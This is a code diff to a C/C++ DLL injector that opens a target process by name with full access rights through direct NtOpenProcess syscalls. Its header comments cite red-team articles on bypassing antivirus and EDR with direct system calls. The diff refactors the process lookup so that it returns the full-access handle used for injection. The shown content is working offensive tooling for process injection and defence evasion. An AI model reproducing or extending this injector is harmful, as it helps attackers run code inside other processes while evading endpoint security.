@@ -21,8 +21,10 @@ extern "C" {
  * g++ inj.o -o inj.exe // for building just the c injector without go
  * or just use the build bat script :-)
  * 
- * Inspired by:
+ * Inspired by research I have conducted form the below sources:
  * My own CGO DLL injector (this was supposed to be modifications but has turned into a rewrite & deeper learning)
+ * https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/
+ * https://signal-labs.com/analysis-of-edr-hooks-bypasses-amp-our-rust-sample/
  * https://github.com/lsecqt / https://www.youtube.com/@Lsecqt 
  * https://alice.climent-pommeret.red/
  * https://github.com/cr-0w
@@ -54,11 +56,12 @@ void logError(const char* message) {
  * @param processName A string representing the name of the process to find.
  * @return DWORD Returns the process ID if found, NULL otherwise.
  */
-DWORD getPidByName(const char* processName) {
+HANDLE getHandleToProcessByName(const char* processName) {
     PROCESSENTRY32 entry; // stores process entry information
     entry.dwSize = sizeof(PROCESSENTRY32); // size of the structure
     char buf[MAX_PATH] = {}; // buffer to store the name of the executable
     size_t charsConverted = 0;
+    HANDLE snapshot = NULL;
     
     // for direct calls via ntdll.dll 
     OBJECT_ATTRIBUTES OA = { sizeof(OA), 0 };
@@ -66,7 +69,7 @@ DWORD getPidByName(const char* processName) {
     HANDLE hProcess = NULL;
 
     // snapshot of all processes in the system
-    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snapshot == INVALID_HANDLE_VALUE) {
         logError("Failed to create process snapshot");
         return 0; // return 0 if snapshot creation fails
@@ -83,11 +86,11 @@ DWORD getPidByName(const char* processName) {
                 // open the process with all possible access rights (n.b. not calling via ntdll as we dont yet have the pid)
                 ULONG_PTR processIdPtr = static_cast<ULONG_PTR>(entry.th32ProcessID);
                 CLIENT_ID clientId = { reinterpret_cast<HANDLE>(processIdPtr), nullptr };
-                status = NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION, &OA, &clientId); // direct call
+                status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &clientId); // direct call
 
                 if (status == 0x0) {
                     CloseHandle(snapshot); // close the snapshot handle as it is no longer needed
-                    return entry.th32ProcessID; // return the process ID TODO just return the handle?
+                    return hProcess; // return the process ID TODO just return the handle?
                 }
             }
         }
@@ -95,7 +98,7 @@ DWORD getPidByName(const char* processName) {
 
     CloseHandle(snapshot); // close the snapshot handle if process not found
     logError("Target process not found");
-    return 0; // return 0 if process not found
+    return NULL; // return 0 if process not found
 }
 
 
@@ -116,7 +119,6 @@ int openProcAndExec(const char *pathToDLL, const char *processToInj) {
 
     OBJECT_ATTRIBUTES OA = { sizeof(OA), 0 };
     NTSTATUS status = 0x0;
-    HANDLE hProcess = NULL;
 
     // validate input params 
     if (pathToDLL == NULL || processToInj == NULL) {
@@ -135,21 +137,9 @@ int openProcAndExec(const char *pathToDLL, const char *processToInj) {
     dllPathToInject[sizeof(dllPathToInject) - 1] = '\0'; // ensure null termination
     size_t dllPathLength = strlen(dllPathToInject) + 1; // length including null terminator
 
-    // get process ID of the target process
-    DWORD pid = getPidByName(processToInj);
-    if (pid == 0) {
-        return -1;
-    }
-
-    // open the target process
-    ULONG_PTR processIdPtr = static_cast<ULONG_PTR>(pid);
-    CLIENT_ID clientId = { reinterpret_cast<HANDLE>(processIdPtr), nullptr }; // required as using direct syscalls
-    
-    status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &clientId); // direct call
-
-    if (status != 0x0) {
-        printf("%lu\n", pid);
-        logError("Failed to open target process");
+    // get a handle to the process we wish to inject into 
+    HANDLE hProcess = getHandleToProcessByName(processToInj);
+    if (hProcess == NULL) {
         return -1;
     }
 
